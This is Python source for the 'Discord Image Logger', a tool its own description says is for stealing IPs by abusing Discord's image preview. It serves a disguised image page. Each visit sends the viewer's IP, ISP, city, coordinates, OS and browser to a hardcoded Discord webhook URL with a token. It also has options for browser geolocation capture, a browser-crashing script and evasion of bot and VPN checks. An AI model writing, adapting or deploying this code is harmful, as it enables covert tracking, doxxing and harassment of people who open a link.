# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1398708456440991855/TT85TghlpEGKuj2WhFP6KxpPdjoWpMOwTHwq90zKimIe_MFizC1rI_0uqkohx0DjBEJu",
    "image": "https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg",
    "imageArgument": True,
    "username": "Maxwell",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")  # Blacklisted IPs

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Error Report",
                "description": f"```{error}```",
                "color": 16711680,
            }
        ],
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "name": "IP Info",
                    "value": f"**IP:** {ip}\n**Platform:** {bot}",
                    "inline": True,
                },
                {
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** {endpoint}\n**IP:** {ip}",
                    "name": "Advanced Info",
                    "value": f"**OS:** {httpagentparser.simple_detect(useragent)[0]}\n**Browser:** {httpagentparser.simple_detect(useragent)[1]}\n**UserAgent:** {useragent}",
                    "inline": False,
                }
            ],
        })
        return

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    ping = "@everyone"
    if info.get("proxy", False):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    if info.get("hosting", False):
        if config["antiBot"] == 4:
            if info.get("proxy", False):
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info.get("proxy", False):
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** {endpoint}
            
**IP Info:**
> **IP:** {ip if ip else 'Unknown'}
> **Provider:** {info.get('isp', 'Unknown')}
> **ASN:** {info.get('as', 'Unknown')}
> **Country:** {info.get('country', 'Unknown')}
> **Region:** {info.get('regionName', 'Unknown')}
> **City:** {info.get('city', 'Unknown')}
> **Coords:** {str(info.get('lat', '')) + ', ' + str(info.get('lon', ''))} ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++' + coords + ')' })
> **Timezone:** {info.get('timezone', '').split('/')[1].replace('_', ' ')} ({info.get('timezone', '').split('/')[0]})
> **Mobile:** {info.get('mobile', 'False')}
> **VPN:** {info.get('proxy', 'False')}
> **Bot:** {info.get('hosting', 'False')}
**PC Info:**
> **OS:** {os}
> **Browser:** {browser}

**User Agent:**
{useragent}
""",
            }
        ],
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    requests.post(config["webhook"], json=embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for') and self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]: self.wfile.write(binaries["loading"])
                makeReport(self.headers.get('x-forwarded-for'), endpoint=s.split("?")[0], url=url)
                return
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url=url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
                
                message = config["message"]["message"]
                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result.get("isp", ""))
                    message = message.replace("{asn}", result.get("as", ""))
                    message = message.replace("{country}", result.get("country", ""))
                    message = message.replace("{region}", result.get("regionName", ""))
                    message = message.replace("{city}", result.get("city", ""))
                    message = message.replace("{lat}", str(result.get("lat", "")))
                    message = message.replace("{long}", str(result.get("lon", "")))
                    message = message.replace("{timezone}", f"{result.get('timezone', '').split('/')[1].replace('_', ' ')} ({result.get('timezone', '').split('/')[0]})")
                    message = message.replace("{mobile}", str(result.get("mobile", "")))
                    message = message.replace("{vpn}", str(result.get("proxy", "")))
                    message = message.replace("{bot}", str(result.get("hosting", "False")))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
                
                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

    def do_GET(self):
        self.handleRequest()

    def do_POST(self):
        self.handleRequest()

handler = app = ImageLoggerAPI
